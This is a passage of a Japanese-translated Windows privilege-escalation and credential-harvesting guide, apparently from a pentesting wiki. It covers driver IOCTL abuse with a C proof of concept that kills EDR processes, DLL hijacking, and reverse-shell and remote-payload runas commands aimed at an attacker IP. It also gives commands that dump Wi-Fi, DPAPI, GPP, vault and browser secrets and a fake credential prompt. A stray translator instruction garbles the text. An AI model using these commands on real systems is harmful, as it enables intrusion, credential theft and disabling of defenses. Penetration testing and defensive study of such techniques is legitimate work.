Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ以下の任意の plugin DLL を autoload します。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置するだけで、起動ごとに（`DllMain` や plugin callbacks からも含めて）`notepad++.exe` 内で自動的に code execution が発生します。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別のユーザによって実行される registry や binary を上書きできるか確認してください。**\
**次のページを** 読んで、興味深い **autoruns locations to escalate privileges** について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

可能性のある **third party weird/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACLで制限することを意図したデバイスオブジェクトを作成する際は、必ず FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドル返却を許可する前に PP/PPL チェックを追加してください。
- IOCTLs（access masks、METHOD_*、入力検証）を制限し、直接カーネル権限を与える代わりに brokered models の導入を検討してください。

防御者向けの検出のアイデア
- 疑わしいデバイス名（例: \\ .\\amsdk*）や悪用を示す特定の IOCTL シーケンスへのユーザーモードからのオープンを監視してください。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の許可/拒否リストを維持してください。


## PATH DLL Hijacking

もし **write permissions inside a folder present on PATH** を持っていると、プロセスによってロードされる DLL をハイジャックして **escalate privileges** できる可能性があります。

PATH 内のすべてのフォルダの権限を確認してください:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**このページで Firewall 関連のコマンドを確認**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧、ルール作成、無効化、無効化...）**

さらに[network enumeration のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも存在します

root user を取得すると任意のポートでリッスンできます（最初に `nc.exe` を使ってポートでリッスンする際、GUI を通じて `nc` を firewall に許可するか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試してみてください。

`WSL` のファイルシステムはフォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で参照できます。

## Windows の資格情報

### Winlogon の資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **自動的にユーザーをログインさせることができる**. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.

Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプション付きで使用できます。以下の例は SMB share 経由でリモートのバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報を使って `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) から取得できることに注意してください。

### DPAPI

The **Data Protection API (DPAPI)** は、データの対称暗号化のための手段を提供します。主に Windows オペレーティングシステム内で、非対称暗号の秘密鍵の対称暗号化に使用されます。この暗号化は、ユーザーまたはシステムのシークレットを利用してエントロピーに大きく寄与します。

**DPAPI は、ユーザーのログインシークレットから導出された対称鍵を通じて鍵の暗号化を可能にします。** システム暗号化が関与するシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、%APPDATA%\Microsoft\Protect\{SID} ディレクトリに格納されます。ここで {SID} はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**ユーザーの秘密鍵を保護するマスターキーと同じファイルに共存する DPAPI キー**は、通常 64 バイトのランダムデータで構成されています。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧できませんが、PowerShell では一覧できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey` を適切な引数（`/pvk` または `/rpc`）で使用して復号できます。

**マスターパスワードで保護された資格情報ファイル**は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
`sekurlsa::dpapi` module を使えば、**memory** から多くの **DPAPI masterkeys** を extract できます（root の場合）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された資格情報を便利に保存する手段として、**scripting** や **automation tasks** にしばしば使われます。これらの資格情報は **DPAPI** で保護されており、通常、作成されたのと同じユーザーが同じコンピュータ上でのみ decrypted できます。

ファイルに含まれる PS credentials を **decrypt** するには、次のようにします：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

次の場所にあります：`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files`\
適切な `/masterkey` を指定して、**Mimikatz** の `dpapi::rdg` モジュールを使用すると、任意の `.rdg` ファイルを**復号**できます。\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
また、**Mimikatz** の `sekurlsa::dpapi` モジュールでメモリから多くの DPAPI マスターキーを**抽出**できます。

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
Windows ワークステーションでは、StickyNotes アプリがパスワードやその他の情報を保存するために使われることが多く、それがデータベースファイルであるとは認識されていないことがよくあります。  
このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索・調査する価値があります。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.  
**AppCmd.exe からパスワードを回収するには、Administrator 権限で実行し、High Integrity level で動作させる必要があることに注意してください。**  
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。  
このファイルが存在する場合、何らかの **credentials** が構成されており、**recovered** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):  
このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください .\
インストーラーは**run with SYSTEM privileges**, 多くは**DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**に脆弱です
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルと Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH private keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、そこに興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内でエントリを見つけた場合、おそらく保存された SSH キーです。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用すれば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが実行されておらず、起動時に自動的に開始させたい場合は、以下を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。sshキーを作成し、`ssh-add`で追加して、sshでマシンにログインしようとしました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称キー認証中に `dpapi.dll` の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索してください

### キャッシュされた GPP パスワード

以前、Group Policy Preferences (GPP) を使用して複数のマシンにカスタムのローカル管理者アカウントを配布できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして格納される Group Policy Objects (GPOs) は任意のドメインユーザーがアクセスできました。第二に、これらの GPP 内のパスワードは公開された既定キーを用いて AES256 で暗号化されており、任意の認証済みユーザーが復号できました。これはユーザーが権限昇格する可能性があるため深刻なリスクをもたらしました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルのうち "cpassword" フィールドが空でないものをスキャンする関数が作成されました。該当するファイルを見つけると、その関数はパスワードを復号してカスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP およびファイルの場所に関する情報が含まれており、この脆弱性の特定と修復に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista より前）_ を検索して、次のファイルを探してください:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してpasswordsを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS の Web 設定
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN の認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を尋ねる

もしユーザーがそれらを知っている可能性があると思うなら、いつでも**ユーザーに自分のcredentials、あるいは別のユーザーのcredentialsさえ入力するよう依頼する**ことができます（注意：クライアントに直接**credentials**を**尋ねる**のは非常に**危険**です）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials を含む可能性のあるファイル名**

以前、次の既知のファイルには **passwords** が **clear-text** または **Base64** で含まれていました。
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
指定されたファイルの本文を貼り付けてください（例: src/windows-hardening/windows-local-privilege-escalation/README.md）。中の英語テキストを受け取ったら、指示どおりマークダウン構文を保持して日本語に翻訳します。複数ファイルがある場合は全部貼ってください。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内の資格情報

Binも確認して、その中に資格情報がないか探してください。

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報が含まれている可能性のあるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**Chrome or Firefox** のパスワードが保存されている dbs を確認するべきです。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこに **パスワード** が保存されている場合があります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windows オペレーティングシステムに組み込まれた技術で、異なる言語で書かれたソフトウェアコンポーネント間の相互通信を可能にします。各 COM コンポーネントは **class ID (CLSID)** によって識別され、各コンポーネントは一つ以上のインターフェースを介して機能を公開し、それらのインターフェースは **interface IDs (IIDs)** によって識別されます。

COM クラスとインターフェースは、それぞれ **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下にレジストリで定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作られ、**HKEY\CLASSES\ROOT** になります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイル内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインで、対象ホスト内のcredentialsを検索するすべてのmetasploit POST moduleを自動的に実行するように作成しました。\
